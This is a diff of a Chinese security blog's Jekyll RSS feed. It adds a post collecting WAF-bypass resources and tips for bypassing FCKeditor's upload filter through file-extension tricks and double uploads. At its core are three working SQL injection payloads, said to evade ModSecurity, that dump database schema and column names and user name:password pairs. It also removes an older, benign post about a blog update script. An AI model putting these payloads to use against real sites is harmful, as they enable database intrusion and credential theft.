@@ -5,13 +5,56 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 12 Aug 2016 16:43:53 +0800</pubDate>
-    <lastBuildDate>Fri, 12 Aug 2016 16:43:53 +0800</lastBuildDate>
+    <pubDate>Fri, 12 Aug 2016 18:43:23 +0800</pubDate>
+    <lastBuildDate>Fri, 12 Aug 2016 18:43:23 +0800</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
     
       <item>
+        <title>waf绕过技巧库</title>
+        <description>&lt;h3 id=&quot;x00-links&quot;&gt;0x00 links&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;waf绕过技巧库：
+http://wafbypass.me/w/index.php/Main_Page  may be a best one```
+http://www.freebuf.com/articles/web/10099.html   WAF绕过的奇技淫巧
+http://tech-technical.com/index.php/2015/11/11/waf-bypass-sql-injection-tutorial/ 老外的技巧
+http://webvuln.blogspot.hk/2015_04_01_archive.html 测试fuzz
+http://www.wooyun.org/bugs/wooyun-2014-089426　　good
+https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9133  90sec新思路
+http://www.idiot-attacker.com/2016/02/macam-macam-kode-bypass-waf.html good
+http://wooyun.org/bugs/wooyun-2010-0121291
+http://wooyun.org/bugs/wooyun-2010-0115175 fuzz2bypass
+http://drops.wooyun.org/tips/7883 
+http://www.securityidiots.com/Web-Pentest/WAF-Bypass/
+http://www.pentest.net.cn/post/7
+http://www.mottoin.com/86886.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;x01-bypassed&quot;&gt;0x01 bypassed&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;modsecurity
+id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.schemata*/--
+id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(column_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.columns where table_name=0x75736572*/--
+id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user*/--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
+        <link>/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</link>
+        <guid isPermaLink="true">/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</guid>
+        
+        <category>waf</category>
+        
+        <category>bypass</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
         <title>fckeditor各版本绕过</title>
-        <description>&lt;p&gt;0x00 fckeditor上传漏洞总结&lt;/p&gt;
+        <description>&lt;h3 id=&quot;x00-fckeditor&quot;&gt;0x00 fckeditor上传漏洞总结&lt;/h3&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://sec.chinabyte.com/206/13708206.shtml
 http://www.it610.com/article/1842939.htm
@@ -19,7 +62,7 @@ http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf &amp;l
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;0x01 asp&lt;/p&gt;
+&lt;h3 id=&quot;x01-asp&quot;&gt;0x01 asp&lt;/h3&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2.6.6
     http://www.hack80.com/thread-320-1-1.html
@@ -27,9 +70,26 @@ http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf &amp;l
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;0x02 php&lt;/p&gt;
+&lt;h3 id=&quot;x02-php&quot;&gt;0x02 php&lt;/h3&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;x03-fckeditor&quot;&gt;0x03 fckeditor经典尝试后缀&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;将后缀改成.php.pjpg
+2&amp;gt;将后缀改成.html
+3&amp;gt;将后缀改成.lnk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;x04-&quot;&gt;0x04 其它上传技巧&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;上传时,延迟一下再上传,有时能bypass admin,用到firefox tamper插件
+    https://www.youtube.com/watch?v=6hJ-d2NYLBg
+2&amp;gt;双文件上传
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -2286,99 +2346,6 @@ to get the current file&#39;s abspath
         <category>python</category>
         
         <category>文件遍历</category>
-        
-        
-        <category>jekyll</category>
-        
-      </item>
-    
-      <item>
-        <title>修正博客更新脚本</title>
-        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:简化所有更新操作并实现换电脑快速还原github上博客至本地
-
-本文针对&quot;Use github and jekyll start github pages&quot;文中的更新脚本作最终修改,原文链接如下
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;a href=&quot;https://3xp10it.github.io/jekyll/2016/04/09/github-jekyll-blog/&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;x01-&quot;&gt;0x01 更新最终博客更新脚本指令如下&lt;/h3&gt;
-
-&lt;h4 id=&quot;abash-a-hrefhttpsrawgithubusercontentcom3xp10itmytoolsmasterupshsmallfont-colorgreenupshfontsmalla&quot;&gt;a&amp;gt;bash脚本 &lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/up.sh&quot;&gt;&lt;small&gt;&lt;font color=&quot;green&quot;&gt;up.sh&lt;/font&gt;&lt;/small&gt;&lt;/a&gt;&lt;/h4&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -d /root/myblog &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -d /root/3xp10it.github.io &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;then
-    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/myblog &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; pkill jekyll;sleep 3 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp index.html tmp.html &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp index_bak.html index.html &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sh -c &lt;span class=&quot;s2&quot;&gt;&quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp _site/index.html index2.html &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp tmp.html index.html &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;congratulations! commands execute ok to here!
-    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/3xp10it.github.io &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp -r ../myblog/_site/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp ../myblog/index2.html . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp ../myblog/index.html . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git status &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git add . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git status &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git commit -a -m &lt;span class=&quot;s2&quot;&gt;&quot;update&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git push -u origin master &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;congratulations! commands execute ok to here!
-    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/myblog &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git status &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git add . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git status &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git commit -a -m &lt;span class=&quot;s2&quot;&gt;&quot;update backup&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git push -u origin master &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;all is well,and all is &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;!
-&lt;span class=&quot;k&quot;&gt;else
-    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;this is the first time you use me,I will download myblog from https://github.com/3xp10it/myblog.git&quot;&lt;/span&gt;
-    mkdir /root/myblog &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/myblog &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git init &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git pull https://github.com/3xp10it/myblog.git &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git remote add origin https://github.com/3xp10it/myblog.git
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;this is the first time you use me,I will download 3xp10it.github.io from https://github.com/3xp10it/3xp10it.github.io.git&quot;&lt;/span&gt;
-    mkdir /root/3xp10it.github.io &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/3xp10it.github.io &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git init &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git pull https://github.com/3xp10it/3xp10it.github.io.git &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git remote add origin https://github.com/3xp10it/3xp10it.github.io.git
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;bpython-a-hrefhttpsrawgithubusercontentcom3xp10itmytoolsmasteruppysmallfont-colorgreenuppyfontsmalla&quot;&gt;b&amp;gt;python脚本 &lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/up.py&quot;&gt;&lt;small&gt;&lt;font color=&quot;green&quot;&gt;up.py&lt;/font&gt;&lt;/small&gt;&lt;/a&gt;&lt;/h4&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;/root/myblog&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;/root/3xp10it.github.io&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;this is the first time you use me,I will download myblog from https://github.com/3xp10it/myblog.git&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mkdir /root/myblog &amp;amp;&amp;amp; cd /root/myblog &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git pull https://github.com/3xp10it/myblog.git &amp;amp;&amp;amp; git remote add origin https://github.com/3xp10it/myblog.git&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;this is the first time you use me,I will download 3xp10it.github.io from https://github.com/3xp10it/3xp10it.github.io.git&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mkdir /root/3xp10it.github.io &amp;amp;&amp;amp; cd /root/3xp10it.github.io &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git pull https://github.com/3xp10it/3xp10it.github.io.git &amp;amp;&amp;amp; git remote add origin https://github.com/3xp10it/3xp10it.github.io.git&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&#39;cd /root/myblog &amp;amp;&amp;amp; pkill jekyll;sleep 3 &amp;amp;&amp;amp; cp index.html tmp.html &amp;amp;&amp;amp; cp index_bak.html index.html &amp;amp;&amp;amp; sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; &amp;amp;&amp;amp; cp _site/index.html index2.html &amp;amp;&amp;amp; cp tmp.html index.html &amp;amp;&amp;amp; echo congratulations! commands execute ok to here!&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&#39;cd /root/3xp10it.github.io &amp;amp;&amp;amp; cp -r ../myblog/_site/* . &amp;amp;&amp;amp; cp ../myblog/index2.html . &amp;amp;&amp;amp; cp ../myblog/index.html . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &quot;update&quot; &amp;amp;&amp;amp; git push -u origin master &amp;amp;&amp;amp; echo congratulations! commands execute ok to here!&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&#39;cd /root/myblog &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &quot;update backup&quot; &amp;amp;&amp;amp; git push -u origin master &amp;amp;&amp;amp; echo all is well,and all is done!&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;x02-attention&quot;&gt;0x02 attention&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;关键指令改变
-这里的远程博客更新指令串较原来的updateall.sh有改变
-cd /root/3xp10it.github.io &amp;amp;&amp;amp; cp -r ../myblog/_site/* . &amp;amp;&amp;amp; cp ../myblog/index2.html . &amp;amp;&amp;amp; cp ../myblog/index.html . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &quot;update&quot; &amp;amp;&amp;amp; git push -u origin master &amp;amp;&amp;amp; echo congratulations! commands execute ok to here!
-
-原来的updateall.sh中对应代码是:
-cd /root/3xp10it.github.io &amp;amp;&amp;amp; cp -r ../myblog/_site/* . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &quot;update&quot; &amp;amp;&amp;amp; git push -u origin master &amp;amp;&amp;amp; echo congratulations! commands execute ok to here!
-其中的&quot;cp -r ../myblog/_site/* .&quot;有问题,因为/root/myblog/_site目录下面对应的index.html为本地jekyll --serve生成的正常的主页,而我需要将最终的主页内嵌这个正常的主页和播放音乐页面,所以需要在执行完cp -r ../myblog/_site/* .后再多两条命令:
-
-cp ../myblog/index2.html .
-cp ../myblog/index.html .
-
-这两条语句可以达到效果是因为:
-
-对应的上一个本地更新命令串:
-cd /root/myblog &amp;amp;&amp;amp; pkill jekyll;sleep 3 &amp;amp;&amp;amp; cp index.html tmp.html &amp;amp;&amp;amp; cp index_bak.html index.html &amp;amp;&amp;amp; sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; &amp;amp;&amp;amp; cp _site/index.html index2.html &amp;amp;&amp;amp; cp tmp.html index.html &amp;amp;&amp;amp; echo congratulations! commands execute ok to here!
-中已经将index.html变成最终内嵌两个html页面的需要的页面,且已经将index2.html变成正常情况下生成的页面,也即执行完本地更新命令串后,/root/myblog下的index.html和index2.html正是所需要拷贝到本地/root/3xp10it.github.io目录的两个文件
-
-
-2&amp;gt;本地远程博客对应关系
-本地/root/myblog对应github远程的myblog,本地的127.0.0.1:4000对应的是本地/root/myblog目录由本地执行jekyll --serve产生的网页效果
-本地/root/3xp10it.github.io对应github远程的3xp10it.github.io,https://3xp10it.github.io对应的是github远程3xp10it.github.io由github服务器jekyll --serve产生的网页效果
-
-
-3&amp;gt;快捷方式
-vi ~/.bashrc
-+alias upa=&quot;python /usr/share/up.py&quot;
-vi ~/.zshrc
-+alias upa=&quot;sh /usr/shrae/up.sh&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Sat, 30 Jul 2016 00:00:00 +0800</pubDate>
-        <link>/jekyll/2016/07/30/update-blog-update-script/</link>
-        <guid isPermaLink="true">/jekyll/2016/07/30/update-blog-update-script/</guid>
-        
-        <category>jekyll</category>
-        
-        <category>github</category>
-        
-        <category>shell</category>
         
         
         <category>jekyll</category>
